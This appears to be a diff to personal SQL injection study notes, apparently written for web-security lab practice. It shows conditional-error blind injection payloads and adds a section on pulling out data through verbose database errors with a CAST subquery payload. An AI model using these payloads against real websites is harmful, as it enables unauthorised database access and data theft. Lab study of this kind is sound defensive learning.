@@ -29,5 +29,10 @@ xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 ```
 
+# Extracting sensitive data via verbose SQL error messages
+Take care about the error output, because it has to show us a error realted to ERROR: invalid input syntax for type integer
+```
+CAST((SELECT example_column FROM example_table) AS int)
+```
 # Exploiting blind SQL injection using out-of-band (OAST) techniques
 [Cheat Sheet Burp](https://portswigger.net/web-security/sql-injection/cheat-sheet)
